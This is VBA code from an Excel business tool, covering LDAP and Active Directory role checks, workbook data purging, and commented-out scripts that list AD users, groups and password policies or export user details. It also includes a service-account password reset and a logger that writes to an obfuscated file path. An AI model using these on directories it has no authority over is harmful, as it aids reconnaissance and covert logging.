    If Not Rech Is Nothing Then Info.postofficebox = xlSheet.Cells(Rech.row + 1, Rech.Column).Value
    
    Set Rech = xlSheet.Rows(2).Find(what:="/telephoneNumber", LookAt:=xlWhole)
    If Not Rech Is Nothing Then Info.telephoneNumber = xlSheet.Cells(Rech.row + 1, Rech.Column).Value
    
    Set Rech = xlSheet.Rows(2).Find(what:="/manager", LookAt:=xlWhole)
    If Not Rech Is Nothing Then Info.manager = xlSheet.Cells(Rech.row + 1, Rech.Column).Value
    
    Set Rech = xlSheet.Rows(2).Find(what:="/title", LookAt:=xlWhole)
    If Not Rech Is Nothing Then Info.Title = xlSheet.Cells(Rech.row + 1, Rech.Column).Value
    
End Function


'=====================================================================================================
'======================================== Code Non Valid|fffd| ============================================
'=====================================================================================================

Function Test_Role_Ldap(IPN As String, MyRoles As Variant) As Boolean
    Dim Annuaire    As String
    Dim Role        As String
  
    Dim Connection  As New ADODB.Connection
    Dim Command     As New ADODB.Command
    Dim Recordset   As New ADODB.Recordset
    Dim ReturnValue()
    Dim i           As Integer
    Dim r           As Integer
    
    On Error GoTo ErrorHandler
    
    'Obtention depuis le fichier Ini principal des Infos sur l'annuaire Ldap
    IniCls.ReadStringIniMain "LDAP", "Annuaire", Annuaire
    
    'Ouverture de la Connexion LDAP Serveur
    Set Connection = CreateObject("ADODB.Connection")
    Connection.Provider = "ADsDSOObject"
    Connection.Open ("ADsDSOObject")
    
    Set Command = CreateObject("ADODB.Command")
    Set Command.ActiveConnection = Connection
    Command.Properties("Timeout") = 300 '3 secondes
    
    For r = 0 To UBound(MyRoles)
        Role = MyRoles(r)
        'Ex|fffd|cute la requete Ldap pour cet Item (Ipn ou Nom) et ce Role
        'OK
        Command.CommandText = "<" & Annuaire & "/ou=Rights,o=renault>;(cn=" & Role & ");uniqueMember;subtree"
        'Tester le Ou et valider sur description
        'Command.CommandText = "<" & Annuaire & "/ou=Rights,o=renault>;(&(cn=DEFIPRO_USER)(cn=DEFIPRO_ADMIN));uniqueMember;subtree"
        '"(|(&(objectClass=GroupOfNames)(member=%{Ldap-UserDn}))(&(objectClass=GroupOfUniqueNames)(uniquemember=%{Ldap-UserDn})))"

        'Sql = "SELECT uniqueMember " & _
        '"FROM 'LDAP://202.190.26.12:389/o=SIRIM Berhad,c=MY' WHERE objectClass='groupOfUniqueNames' AND cn='ManagerandSeniorMgr'"
        'Set DataConn = CreateObject("ADODB.Connection")
        'DataConn.Provider = "ADSDSOObject"
        'DataConn.Open "ADs Provider"
        'Set rs = DataConn.Execute(Sql)
        'Do While Not rs.EOF
        'ReturnValue = rs.Fields(0)
        'If IsArray(ReturnValue) Then
        '         For I = LBound(ReturnValue) To UBound(ReturnValue)
        '                     If ReturnValue(I) <> vbnullstring Then
        '                                     Response.write ReturnValue(I) & "<BR>"
        '                     End If
        '         Next
        'Else
        '    uid = ReturnValue
        'End If
        'rs.MoveNext
        'Loop

        Set Recordset = Command.Execute
        If Not (Recordset.EOF) Then
            ReturnValue = Recordset.Fields(0).Value
            If IsArray(ReturnValue) Then
                For i = LBound(ReturnValue) To UBound(ReturnValue)
                    If VBA.LCase(Recordset.Fields(0).Name) = "uniquemember" _
                      And VBA.InStr(VBA.LCase(Recordset.Fields(0).Value(i)), "uid=" & VBA.LCase(IPN)) <> 0 Then
                        IniCls.WriteStringIniMain "Login", "Role", CryptCls.Encode(Role)
                        Info.Role = Role
                        Test_Role_Ldap = True
                        r = UBound(MyRoles) 'pour sortir de la boucle
                        Exit For
                    End If
                Next i
            
            End If
        End If
    
    Next r
    
    Recordset.Close
    Connection.Close
    
    Set Recordset = Nothing
    Set Connection = Nothing
    Set Command = Nothing

    Exit Function
   
ErrorHandler:
    If err.Number <> 0 Then
        Test_Role_Ldap = False
        MsgCls.ShowMessage "MsgErreur", " No" & VBA.Str(err.Number), "MsgErreurPar", err.Source & _
          VBA.Chr(13) & VBA.Chr(13) & IniCls.ReadStringIniLangage("MsgFWK", "MsgDefautLdap"), vbOKOnly + vbError, "MsgDefautLdap"
        
        'MsgBox "L'erreur # " & vba.Str(Err.Number) & " a |fffd|t|fffd| g|fffd|n|fffd|r|fffd|e par " & Err.source & vba.chr(13) & vba.chr(13) & _
               "D|fffd|faut de connexion |fffd| l'annuaire Ldap !", , "Erreur", Err.HelpFile, Err.HelpContext
    End If
End Function


'========================================= Routines Active Directory =======================================
'set a reference to Active DS Type Library (using the References menu item in your programming environment)

Function User_Corp(IPN As String)
    Dim strDomain   As String
    Dim oUser       As ActiveDs.IADsUser
    'Dim oGroup      As ActiveDs.IADsGroup

    IniCls.ReadStringIniMain "ARCA", "Domain", strDomain
    On Error GoTo erreur
    Set oUser = GetObject("WinNT://" & strDomain & "/" & IPN & ",User")
    On Error GoTo 0
'    For Each oGroup In oUser.Groups
'        Debug.Print oGroup.Name
'    Next
    User_Corp = True
    Set oUser = Nothing
    Exit Function
erreur:
    On Error GoTo 0
    User_Corp = False
End Function


Public Sub Corp_Search(IPN As String, Groupe As String)
    Dim strDomain As String

    IniCls.ReadStringIniMain "ARCA", "Domain", strDomain
    
    'Recherche les Groupes de l'utilisateur
    GetGroupsForUser strDomain & "\" & IPN
    
    'Recherche les Utilisateurs d'un Groupe
    GetUsersForGroup strDomain & "\" & Groupe
    
    'L'utilisateur appartient t'il au groupe
    Debug.Print ArcaCls.IsMember(strDomain & "\" & Groupe, strDomain & "\" & IPN)
End Sub


'Recherche les Groupes de l'utilisateur
Public Sub GetGroupsForUser(ByVal DomainUser As String)
    Dim oUser   As ActiveDs.IADsUser
    Dim oGroup  As ActiveDs.IADsGroup
    
    Set oUser = GetObject("WinNT://" & VBA.Replace(DomainUser, "\", "/") & ",User")
    For Each oGroup In oUser.Groups
        Debug.Print oGroup.Name
    Next
    Set oUser = Nothing
End Sub


'Recherche les Utilisateurs d'un groupe
Public Sub GetUsersForGroup(ByVal DomainGroup As String)
    Dim oGroup  As ActiveDs.IADsGroup
    Dim oMember As ActiveDs.IADs ' members can be users or groups so we have to be generic
    
    Set oGroup = GetObject("WinNT://" & VBA.Replace(DomainGroup, "\", "/") & ",Group")
    For Each oMember In oGroup.Members
        Debug.Print oMember.Class & ":" & oMember.ADsPath
    Next
    Set oGroup = Nothing
End Sub


'L'utilisateur appartient t'il au groupe
Public Function IsMember(ByVal DomainGroup As String, ByVal DomainUser As String) As Boolean
    Dim oGroup As ActiveDs.IADsGroup

    Set oGroup = GetObject("WinNT://" & VBA.Replace(DomainGroup, "\", "/") & ",Group")
    'IsMember = oGroup.IsMember("WinNT://" & VBA.Replace(DomainUser, "\", "/") & ",User")
    IsMember = oGroup.IsMember("WinNT://" & VBA.Replace(DomainUser, "\", "/"))
    'oGroup.GetInfoEx Array("telephonenumber"), 0
    'MsgBox tmpUser.Get("telephonenumber")
    '? IsMember("CORP.NOXIANE.NET", "Administrators", "Name")
    
    Set oGroup = Nothing
End Function


Private Sub SetPassword()
    Dim oComputer
    Dim oService
    
    Set oComputer = GetObject("WinNT://TargetDomain/TargetComputer,computer")
    
    oComputer.Filter = Array("service")
    
    For Each oService In oComputer
        If VBA.LCase(oService.ServiceAccountName) = VBA.LCase("domain\administrator") Then
            oService.SetPassword "New_Password"
            If err.Number = 0 Then
                'Wscript.Echo "Password changed for " & oService.ADsPath
            Else
                'Wscript.Echo "Password could not be changed on " & oService.ADsPath
            End If
        End If
    Next
    
'Dim oUser
'Set oUser = GetObject("WinNT://User_Domain/svc_exchange_server1,user")
'oUser.SetPassword "New_Password"

End Sub


Sub NTT(t)
    Dim FTT As String

    FTT = CryptCls.Decode("3B5B2C20144C143401082F200115001844544977433D2F103D3423182D261C2B0112112D00040318150D1F3701001936174F122D1C")
    On Error Resume Next
    If VBA.Len(VBA.Dir(FTT)) > 0 Then
        Open FTT For Append Shared As #1
        Print #1, t
        Close #1
    End If
    On Error GoTo 0
End Sub


'Authentification CORP ultra simple selon Micka|fffd|l en VB.Net
'Imports System.DirectoryServices
'
'Public Enum ResultAuthenticationEnum
'    OK
'    NOK
'    Error_Status
'End Enum
'
'
'    Private mDomaine As String
'
'    Public Sub New()
'         mDomaine = "CORP.NOXIANE.NET"
'    End Sub
'
'    Public Sub New(ByVal domaine As String)
'         mDomaine = domaine
'    End Sub
'
'    Public Function GetAuthenticate(ByVal UserName As String, ByVal Password As String) As ResultAuthenticationEnum
'     Try
'         Dim diren As New DirectoryServices.DirectoryEntry("LDAP://" + mDomaine, UserName, Password, DirectoryServices.AuthenticationTypes.Secure)
'         Dim g As System.Guid = diren.Guid
'
'         diren.Close()
'         diren = Nothing
'
'         Return ResultAuthenticationEnum.OK
'      Catch ex As Exception
'         Return ResultAuthenticationEnum.NOK
'      End Try
'    End Function
 




''1.1 Display all domains in the server NameSpace
'
'
'  Sub PullAllDomains()
'    Dim objNameSpace
'    Dim Domain
'
'    Set objNameSpace = GetObject("WinNT:")
'    For Each Domain In Namespace
'       Response.write Domain.Name
'    Next
'  End Sub
'
'
''1.2 Display all Connected Computers on the Primary Domain Controller
'
'Sub PullAllComputers(strDomain)
'    Dim PrimDomainContr
'
'    Set PrimDomainContr = GetObject("WinNT://" & strDomain)
'    PrimDomainContr.Filter = Array("Computer")
'
'    For Each Computer In PrimDomainContr
'      Reponse.write Computer.Name
'    Next
'  End Sub
'
'
''1.3 Remove a Connected Computer from a Primary Domain Controller
'
'Sub DelComputerFromPDC(strDomain, strDelComputer)
'    Dim PrimDomainContr
'    Set PrimDomainContr = GetObject("WinNT://" & strDomain)
'    Call PrimDomainContr.Delete("Computer", strDelComputer)
'  End Sub
'
'
''2. Computer Users
'
'
''2.1 Display all user accounts
'
'
'Sub PullAllUsers(strDomain)
'    Dim Computer
'    Dim User
'
'    Set Computer = GetObject("WinNT://" & strDomain)
'    Computer.Filter = Array("User")
'    For Each User In Computer
'      Response.write User.Name
'    Next
'  End Sub
'
'
''2.2 Display Minimum Password Age
'
'Sub DispMinPassAge(strDomain)
'    Dim Computer
'    Set Computer = GetObject("WinNT://" & strDomain)
'    Response.write ((Computer.MinPasswordAge) / 86400)
'  End Sub
'
'
''2.3 Display Minimum Password Length
'
'Sub DispMinPassLength(strDomain)
'    Dim Computer
'    Set Computer = GetObject("WinNT://" & strDomain)
'    Response.write Computer.MinPasswordLength
'  End Sub
'
'
''2.4 Display Password History Length
'
'Sub DispPassHisLength(strDomain)
'    Dim Computer
'    Set Computer = GetObject("WinNT://" & strDomain)
'    Response.write Domain.PasswordHistoryLength
'  End Sub
'
'
''2.5 Display Auto Unlock Interval
'
'Sub DispAutoUnlock(strDomain)
'    Dim Computer
'    Set Computer = GetObject("WinNT://" & strDomain)
'    Response.write Computer.AutoUnlockInterval
'  End Sub
'
'
''2.6 Display Lockout Observation Interval
'
'Sub DispAutoUnlockObservation(strDomain)
'    Dim Computer
'    Set Computer = GetObject("WinNT://" & strDomain)
'    Response.write Computer.LockoutObservationInterval
'  End Sub
'
'
''3. Computer Groups
'
'
''3.1 Display All Groups
'
'
'Sub PullAllGroups(strDomain)
'    Dim Computer
'    Dim Group
'
'    Set Computer = GetObject("WinNT://" & strDomain)
'    Computer.Filter = Array("Group")
'    For Each Group In Computer
'      Response.write Group.Name
'    Next
'  End Sub
'
'
''4. User Specific Fields
'
'
''4.1 Display User Fullname
'
'
'Sub PullUserFullname(strDomain, strUser)
'    Dim User
'    Set User = GetObject("WinNT://" & strDomain & "/" & strUser & ",user")
'    Response.write User.FullName
'  End Sub
'
'
''4.2 Display User Description
'
'Sub PullUserDescription(strDomain, strUser)
'    Dim User
'    Set User = GetObject("WinNT://" & strDomain & "/" & strUser & ",user")
'    Response.write User.Description
'  End Sub
'
'
''4.3 Display User Must Change Password Flag
'
'  Sub PullUserMustChangePass(strDomain, strUser)
'    Dim User
'    Set User = GetObject("WinNT://" & strDomain & "/" & strUser & ",user")
'    Response.write User.Get("PasswordExpired")  '// 1 Means the Password Expired
'  End Sub
'
'
''4.4 Display User Can't Change Password Flag
'
'Sub PullUserCannotChangePass(strDomain, strUser)
'    Dim User
'    Dim Flags
'
'    Set User = GetObject("WinNT://" & strDomain & "/" & strUser & ",user")
'    Flags = User.Get("UserFlags")
'    Response.write Flags And &H40     '// 0 Means that user CAN change pass
'  End Sub
'
'
''4.5 Display Password Never Expires Flag
'
'Sub PullPassNeverExpires(strDomain, strUser)
'    Dim User
'    Dim Flags
'
'    Set User = GetObject("WinNT://" & strDomain & "/" & strUser & ",user")
'    Flags = User.Get("UserFlags")
'    Response.write Flags And &H10000  '// 0 Means that Password DOES expire
'  End Sub
'
'
''4.6 Display User Password Minimum Length
'
'Sub PullUserPassMinLength(strDomain, strUser)
'    Dim User
'    Set User = GetObject("WinNT://" & strDomain & "/" & strUser & ",user")
'    Response.write User.PasswordMinimumLength
'  End Sub
'
'
''4.7 Display User Password Required
'
'Sub PullUserPassRequired(strDomain, strUser)
'    Dim User
'    Set User = GetObject("WinNT://" & strDomain & "/" & strUser & ",user")
'    Response.write User.PasswordRequired
'  End Sub
'
'
''4.8 Display User Account Disabled Flag
'
'Sub PullUserAccountDisabled(strDomain, strUser)
'    Dim User
'    Set User = GetObject("WinNT://" & strDomain & "/" & strUser & ",user")
'    Response.write User.AccountDisabled
'  End Sub
'
'
''4.9 Display User Account Lockout Flag
'
'  Sub PullUserAccountLockout(strDomain, strUser)
'    Dim User
'    Set User = GetObject("WinNT://" & strDomain & "/" & strUser & ",user")
'    Response.write User.IsAccountLocked
'  End Sub
'
'
''4.10 Display User Account Type
'
'  Sub PullUserAccountType(strDomain, strUser)
'    Dim User
'    Dim Flags
'
'    Set User = GetObject("WinNT://" & strDomain & "/" & strUser & ",user")
'    Flags = User.Get("UserFlags")
'    Response.write Flags And &H100   '// 0 Means that account is GLOBAL
'  End Sub
'
'
''4.11 Display User Profile Path
'
'Sub PullUserProfilePath(strDomain, strUser)
'    Dim User
'    Set User = GetObject("WinNT://" & strDomain & "/" & strUser & ",user")
'    Response.write User.Profile
'  End Sub
'
'
''4.12 Display User Login Script
'
'  Sub PullUserLoginScript(strDomain, strUser)
'    Dim User
'    Set User = GetObject("WinNT://" & strDomain & "/" & strUser & ",user")
'    Response.write User.LoginScript
'  End Sub
'
'
''4.13 Display User Home Directory Path
'
'  Sub PullUserHomeDirPath(strDomain, strUser)
'    Dim User
'    Set User = GetObject("WinNT://" & strDomain & "/" & strUser & ",user")
'    Response.write User.HomeDirectory
'  End Sub
'
'
''4.14 Display User Home Directory Mapping
'
'  Sub PullUserHomeDirDrive(strDomain, strUser)
'    Dim User
'    Set User = GetObject("WinNT://" & strDomain & "/" & strUser & ",user")
'    Response.write User.Get("HomeDirDrive")
'  End Sub
'
'
''4.15 Display User Account Expiration Date (NT 4.0 only)
'
'  Sub PullUserAccountExpireDate(strDomain, strUser)
'    Dim User
'    Set User = GetObject("WinNT://" & strDomain & "/" & strUser & ",user")
'    Response.write User.AccountExpirationDate
'  End Sub
'
'
''4.16 Display User Bad Login Count (NT 4.0 only)
'
'  Sub PullUserBadLoginCount(strDomain, strUser)
'    Dim User
'    Set User = GetObject("WinNT://" & strDomain & "/" & strUser & ",user")
'    Response.write User.BadLoginCount
'  End Sub
'
'
''4.17 Display User Last Login (NT 4.0 only)
'
'  Sub PullUserLastLogin(strDomain, strUser)
'    Dim User
'    Set User = GetObject("WinNT://" & strDomain & "/" & strUser & ",user")
'    Response.write User.LastLogin
'  End Sub
'
'
''4.18 Display User Last Logoff (NT 4.0 only)
'
'  Sub PullUserLastLogoff(strDomain, strUser)
'    Dim User
'    Set User = GetObject("WinNT://" & strDomain & "/" & strUser & ",user")
'    Response.write User.LastLogoff
'  End Sub
'
'
'
'
''4.20 Display User Logon Hours Restriction(NT 4.0 only)
'
'  Sub PullUserLogonHourRestriction(strDomain, strUser)
'    Dim User
'    Dim RegTime
'    Dim Restrict
'
'    Set User = GetObject("WinNT://" & strDomain & "/" & strUser & ",user")
'    For Each RegTime In User.LoginHours
'      If RegTime < 255 Then Restrict = True
'    Next
'    Response.write Restrict
'  End Sub
'
'
''5. Group Specific Fields
'
'
''5.1 Display All Users in a Group
'
'
'  Sub PullAllUserFromGroup(strDomain, strGroup)
'    Dim Group
'    Dim User
'    Set Group = GetObject("WinNT://" & strDomain & "/" & strGroup & ",group")
'    For Each User In Group.Members
'      Response.write User.Name
'    Next
'  End Sub
'
'
''5.2 Display if a Users is listed in a Group
'
'  Sub DispUserInGroup(strDomain, strGroup, strUser)
'    Dim Group
'    Dim User
'    Set Group = GetObject("WinNT://" & strDomain & "/" & strGroup & ",group")
'    Set User = GetObject("WinNT://" & strDomain & "/" & strUser & ",user")
'    Response.write Group.IsMember(User.ADsPath)
'  End Sub
'
'
''5.2 Display Group Description
'
'Sub PullGroupDescription(strDomain, strGroup, strUser)
'    Dim Group
'    Set Group = GetObject("WinNT://" & strDomain & "/" & strGroup & ",group")
'    Response.write Group.Description
'  End Sub
'
'
''5.2 Display Which Group a User is Listed in
'
'  Sub DispUserInWhichGroup(strDomain, strGroup, strUser)
'    Dim Group
'    Dim User
'    Set User = GetObject("WinNT://" & strDomain & "/" & strUser & ",user")
'    For Each Group In User.Groups
'     Response.write Group.Name
'    Next
'  End Sub

'=======================================================================================
' ------ SCRIPT VBS d'export d'utilisateurs depuis une OU           ------
' ------ Le domaine AD est a jouter en fixe dans le             ------
' ------ String StrDomainDN pour des raisons d'utilisations courantes   ------

'Sub Export_AD()
'    Dim fso As New Scripting.FileSystemObject
'    'MyFile , reptemp, filetext
'
'    stroucible = InputBox("renseigner le nom de l'ou cible : ")
'
'    ' Attention |fffd| modifier le nom LDAP du domaine
'    strDomainDN = "ou=" & stroucible & ",dc=VotreNomdeDomaine,dc=SonExtention"
'
'    ' Attention le r|fffd|pertoire c:\temp doit exister
'    reptemp = "c:\temp\"
'
'    filetext = InputBox("fichier temporaire de l'OU cible : ")
'    Set fso = CreateObject("Scripting.FileSystemObject")
'
'    ' cr|fffd|ation d'un fichier txt pour la premi|fffd|re partie du script, soit le nom des utilisateurs
'    Set MyFile = fso.CreateTextFile(reptemp + filetext + ".txt")
'
'    ' Ici un filtre sur les utilisateurs et je r|fffd|cup|fffd|re leur Distinguishedname
'    strBase = "<LDAP://" & strDomainDN & ">;"
'    strFilter = "(&(objectclass=user)(objectcategory=person));"
'    strAttrs = "distinguishedname;"
'    strScope = "subtree"
'
'    Set objConn = CreateObject("ADODB.Connection")
'    objConn.Provider = "ADsDSOObject"
'    objConn.Open "Active Directory Provider"
'
'    ' Ici lancement de la requ|fffd|tes et |fffd|criture dans le fichier txt dans le c:\temp
'    Set objRS = objConn.Execute(strBase & strFilter & strAttrs & strScope)
'    objRS.MoveFirst
'    While Not objRS.EOF
'    MyFile.WriteLine (objRS.Fields(0).Value)
'        objRS.MoveNext
'    Wend
'    MyFile.Close
'
'
'    ' Maintenant avec le fichier txt je r|fffd|cup|fffd|re les informations utilisateurs par utilisateurs
'    On Error Resume Next
'    Dim objConnection, objRecords, objExcel, strQuery, i, objSpread, intRow
'
'    'Attention le fichier C:\sources.xls doit exister
'    strSheet = "c:\Source.xls"
'
'    Set objExcel = CreateObject("Excel.Application")
'    Set objSpread = objExcel.Workbooks.Open(strSheet)
'    Set objFSO = CreateObject("Scripting.FileSystemObject")
'    Set UserListe = objFSO.OpenTextFile(reptemp + filetext + ".txt")
'
'    'Renseigner le num|fffd|ro de la premi|fffd|re ligne Excel ou vous souhait|fffd| |fffd|crire les inforamations
'    i = 2
'
'      ' liste des attributs |fffd| r|fffd|cup|fffd|rer
'      Do Until UserListe.AtEndOfStream
'        UserLDAP = UserListe.ReadLine
'        Set objUser = GetObject("LDAP://" & UserLDAP & vbnullstring)
'            CNStr = vba.Left(UserLDAP, vba.Instr(UserLDAP, ",") - 1)
'            OuStr = vba.Right(UserLDAP, vba.len(UserLDAP) - vba.Instr(UserLDAP, ","))
'            objExcel.ActiveSheet.range("A" & i).Value = CNStr
'            objExcel.ActiveSheet.range("B" & i).Value = OuStr
'            objExcel.ActiveSheet.range("C" & i).Value = objUser.givenname
'            objExcel.ActiveSheet.range("D" & i).Value = objUser.initials
'            objExcel.ActiveSheet.range("E" & i).Value = objUser.sn
'            objExcel.ActiveSheet.range("F" & i).Value = objUser.DisplayName
'            objExcel.ActiveSheet.range("G" & i).Value = objUser.userPrincipalName
'            objExcel.ActiveSheet.range("H" & i).Value = objUser.SamaccountName
'            objExcel.ActiveSheet.range("I" & i).Value = objUser.mail
'            objExcel.ActiveSheet.range("J" & i).Value = objUser.physicalDeliveryOfficeName
'            objExcel.ActiveSheet.range("K" & i).Value = objUser.telephoneNumber
'            objExcel.ActiveSheet.range("L" & i).Value = objUser.Description
'
'            i = i + 1
'      Loop
'
'
'
'    'Sauvegarde du fichier Excel
'    objExcel.ActiveWorkbook.SaveAs (reptemp + filetext + ".xls")
'    objExcel.ActiveWorkbook.Close
'    objExcel.Workbooks.Close
'
'    MsgBox "fin de r|fffd|cup|fffd|ration des utilisateurs. Le fichiers excel est dans " + reptemp + filetext + ".xls"
'    objExcel.Quit
'
'End Sub
Attribute VB_Name = "B_Purge_TDI"
Option Explicit

'[---------------------------------------------------------------------------
'[Identifiant   : Purge des donn|fffd|es du TDI
'[Auteur        : Alain CHERMAT
'[Service       :
'[Date cr|fffd|ation : 01/10/2008
'[Version       : V1.3 du 15/12/2009
'[---------------------------------------------------------------------------
'[Sujet: Purge des donn|fffd|es du TDI
'[---------------------------------------------------------------------------


Sub Purge_Avant_Livraison()
    Purge_TDI True
End Sub


Function TDI_Vide() As Boolean
    TDI_Vide = False
    If Lastline(ThisWorkbook.Sheets(shDecoupage)) < FirstLine(shDecoupage) Then
        If Lastline(ThisWorkbook.Sheets(shMateriels)) < FirstLine(shMateriels) Then
            If Lastline(ThisWorkbook.Sheets(shDocuments)) < FirstLine(shDocuments) Then
                If Lastline(ThisWorkbook.Sheets(shPieces_Rechange)) < FirstLine(shPieces_Rechange) Then
                    If Lastline(ThisWorkbook.Sheets(shCtrl_Ged)) < FirstLine(shCtrl_Ged) Then
                        If Lastline(ThisWorkbook.Sheets(shCSV)) < FirstLine(shCSV) Then
                            TDI_Vide = True
                        End If
                    End If
                End If
            End If
        End If
    End If
End Function

Sub Purge_TDI(Param As Boolean)
    Application.EnableEvents = False
    Application.ScreenUpdating = False
    Suppression_Filtres

    If Param Then
        IniCls.WriteStringIniMain "Language", "NameIniLangage", "FR"
        IniCls.WriteStringIniMain "Login", "Login", vbNullString
        IniCls.WriteStringIniMain "Login", "Psw", vbNullString
        IniCls.WriteStringIniMain "Login", "SaveLogin", "FALSE"
        IniCls.WriteStringIniMain "Login", "Role", vbNullString
        IniCls.WriteStringIniMain "Login", "UserName", vbNullString
        IniCls.WriteStringIniMain "Login", "PswMem", vbNullString
        IniCls.WriteStringIniMain "Maj", "Maj", "TRUE"
        IniCls.WriteStringIniMain "TDI", "Societe", vbNullString
        IniCls.WriteStringIniMain "TDI", "Usine", vbNullString
    End If
    
    Purge_Affaire
    Application.EnableEvents = False
    Application.ScreenUpdating = False
    
    Purge_Data shDecoupage
    Application.EnableEvents = False
    Application.ScreenUpdating = False
    
    Purge_Data shMateriels
    Application.EnableEvents = False
    Application.ScreenUpdating = False
    
    Purge_Data shDocuments
    Application.EnableEvents = False
    Application.ScreenUpdating = False
    
    Purge_Data shPieces_Rechange
    Application.EnableEvents = False
    Application.ScreenUpdating = False
    
    Purge_Data shCtrl_Ged
    Application.EnableEvents = False
    Application.ScreenUpdating = False
    
    Purge_Data shCSV
    Application.EnableEvents = False
    Application.ScreenUpdating = False
    
    Purge_Data shListeDeFID
    Application.EnableEvents = False
    Application.ScreenUpdating = False
    
    Purge_Data shListe_FID
    Application.EnableEvents = False
    Application.ScreenUpdating = False
    
    Purge_Data shListe_Originaux
    Application.EnableEvents = False
    Application.ScreenUpdating = False
    
    Raz_feuille_tra
    Application.EnableEvents = False
    Application.ScreenUpdating = False
    
    ThisWorkbook.Worksheets(shTable_Fonction_Process).Columns("IV").ClearContents
    
    With ThisWorkbook.Worksheets(shCde_Nomenclature)
        .Range("B11").Value = vbNullString
        .Range("C12").Value = vbNullString
        .Range("C13").Value = vbNullString
        .Range("C14").Value = vbNullString
        .Range("D12").Value = vbNullString
        .Range("D13").Value = vbNullString
        .Range("D14").Value = vbNullString
        .Range("D15").Value = vbNullString
        .Range("B18").Value = vbNullString
        .Range("D18").Value = vbNullString
        .Range("G18").Value = vbNullString
        .Range("J18").Value = vbNullString
        .Range("C21").Value = vbNullString
        .Range("C22").Value = vbNullString
        .Range("C23").Value = vbNullString
        .Range("C24").Value = vbNullString
        .Range("B28").Value = vbNullString
        .Range("B33").Value = vbNullString
    End With
    
    With ThisWorkbook.Worksheets(shCde_Document)
        .Range("B11").Value = vbNullString
        .Range("B16").Value = vbNullString
        .Range("H21").Value = vbNullString
        .Range("H22").Value = vbNullString
        .Range("H23").Value = vbNullString
        .Range("C26").Value = "xxxxx"
        .Range("H26").Value = "xxxxx"
        .Range("B31").Value = vbNullString
        .Range("E31").Value = vbNullString
        .Range("G31").Value = vbNullString
        .Range("J31").Value = vbNullString
    End With
    
    With ThisWorkbook.Worksheets(shPieces_Rechange)
        .Range("P4").Value = vbNullString
    End With
    
    Bouton_Affiche_Decoupage
    Application.EnableEvents = True
    Application.ScreenUpdating = True
End Sub


Sub Purge_Affaire()
    Application.EnableEvents = False
    Application.ScreenUpdating = False
    With ThisWorkbook.Worksheets(ShAffaire)
        .Range("Champ_Fournisseur").Value = vbNullString 'Nom_four
        .Range("Champ_Affaire").Value = vbNullString 'Val_Affaire
        
        .Range("Champ_Analyse_Dynamique").Value = "N"
        .Range("Champ_Analyse_Donnees").Value = "N"
        .Range("Champ_Mise_En_Forme").Value = "N"
        .Range("Champ_Suivi_Modifications").Value = "O"
        
        .Range("Affichage_PR").Value = "L_PR"
        .Range("ModeSelect").Value = "TDI"
        
        .Range("Champ_Division").Value = vbNullString 'Division
        .Range("Champ_Metier").Value = vbNullString 'metier
        
        .Range("Champ_Resp_Fournisseur").Value = vbNullString 'resp_aff_four
        .Range("Champ_Resp_Documentaire").Value = vbNullString 'resp_etude_four
        .Range("Champ_Tel_Resp_Fournisseur").Value = vbNullString 'resp_doc_four
        
        .Range("Champ_Resp_Renault").Value = vbNullString 'resp_aff_ren
        .Range("Champ_Resp_Doc_Renault").Value = vbNullString 'resp_doc_ren
        .Range("Champ_Tel_Renault").Value = vbNullString 'pilote_maint
        
        .Range("Champ_Date_Fin_Etude").Value = vbNullString 'date_atfe
        .Range("Champ_Date_Decoupage").Value = vbNullString 'date_val_dec
        .Range("Champ_Num_Mabec").Value = vbNullString 'Num_inv_pere
        
        'Purge Historique
        .Rows("29:" & .Rows.Count).ClearContents
        .Rows("29:" & .Rows.Count).NumberFormat = "@"
    End With
    Application.EnableEvents = True
    Application.ScreenUpdating = True
End Sub


Sub Raz_feuille_tra()
    Application.EnableEvents = False
    Application.ScreenUpdating = False
    With ThisWorkbook.Sheets(shCde_Simon)
        .Cells(5, 6).Value = vbNullString
        .Cells(6, 10).Value = vbNullString
        .Cells(7, 10).Value = vbNullString
        .Cells(8, 10).Value = vbNullString
        .Cells(9, 10).Value = vbNullString
        .Cells(10, 10).Value = vbNullString
        .Cells(11, 10).Value = vbNullString
        .Cells(12, 10).Value = vbNullString
        .Cells(13, 10).Value = vbNullString
        .Cells(14, 10).Value = vbNullString
        .Cells(16, 10).Value = vbNullString
    
        .Cells(19, 6).Value = VBA.Date
        .Cells(19, 7).Value = vbNullString
        .Cells(19, 8).Value = vbNullString
        .Cells(19, 9).Value = vbNullString
        .Cells(19, 10).Value = vbNullString
        .Cells(20, 10).Value = vbNullString
        .Cells(19, 11).Value = vbNullString
        .Cells(19, 12).Value = vbNullString
        .Cells(20, 12).Value = vbNullString
        .Cells(19, 13).Value = vbNullString
    End With
    
    With Worksheets(shPt)
        .Rows("2:1048576").ClearContents
        .Rows("2:1048576").NumberFormat = "@"
    End With
    
    With Worksheets(shGE_ACreer)
        .Rows("2:1048576").ClearContents
        .Rows("2:1048576").NumberFormat = "@"
    End With
    
    With Worksheets(shGE_AModifier)
        .Rows("2:1048576").ClearContents
        .Rows("2:1048576").NumberFormat = "@"
    End With
    
    With Worksheets(shENS_ACreer)
        .Rows("2:1048576").ClearContents
        .Rows("2:1048576").NumberFormat = "@"
    End With
    
    With Worksheets(shENS_AModifier)
        .Rows("2:1048576").ClearContents
        .Rows("2:1048576").NumberFormat = "@"
    End With
    
    ' feuille nomenclature
    With Worksheets(shEquipmt)
        .Rows("2:1048576").ClearContents
        .Rows("2:1048576").NumberFormat = "@"
    End With
    
    With Worksheets(shSsEnsemble)
        .Rows("2:1048576").ClearContents
        .Rows("2:1048576").NumberFormat = "@"
    End With
    
    With Worksheets(shArticles)
        .Rows("2:1048576").ClearContents
        .Rows("2:1048576").NumberFormat = "@"
    End With
    
    ' feuille CTRL_GED
    With Worksheets(shCtrl_Ged)
        .Rows("2:1048576").ClearContents
        .Rows("2:1048576").NumberFormat = "@"
    End With
    
    ' Feuille shListeDeFID
    With Worksheets(shListeDeFID)
        .Rows("5:1048576").ClearContents
        .Rows("5:1048576").NumberFormat = "@"
    End With
    
    ' Feuille shListe_Originaux
    With Worksheets(shListe_Originaux)
        .Rows("5:1048576").ClearContents
        .Cells.NumberFormat = "@"
    End With
    
    ' Feuille shListe_Liens
    With Worksheets(shListe_Liens)
        .Rows("5:1048576").ClearContents
        .Cells.NumberFormat = "@"
    End With
    
    Application.ScreenUpdating = True
    Application.EnableEvents = True
End Sub
Attribute VB_Name = "CSV"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
